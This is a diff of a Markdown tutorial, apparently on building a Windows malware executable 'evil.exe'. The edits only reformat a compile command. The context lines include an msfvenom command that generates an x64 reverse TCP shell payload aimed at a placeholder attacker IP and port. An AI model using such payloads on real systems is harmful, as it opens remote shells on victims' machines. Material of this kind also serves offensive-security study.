@@ -118,6 +118,7 @@ int main () {                               // 2
 ---
 ### Code
 ```C
+//evil.cpp
 #include <windows.h>                // 1
 #include <stdio.h>
 #include <stdlib.h>
@@ -205,7 +206,10 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker's ip> LPORT=4444 -f c
 ### Compile and Run
 > **Compile**
 
-**On Attackers' Machine:** `x86_64-w64-mingw32-gcc evil.cpp -o evil.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
+**On Attackers' Machine:** 
+```sh
+x86_64-w64-mingw32-gcc evil.cpp -o evil.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+```
 ![[images/Pasted image 20250426162740.png]]
 
 >**Run** 
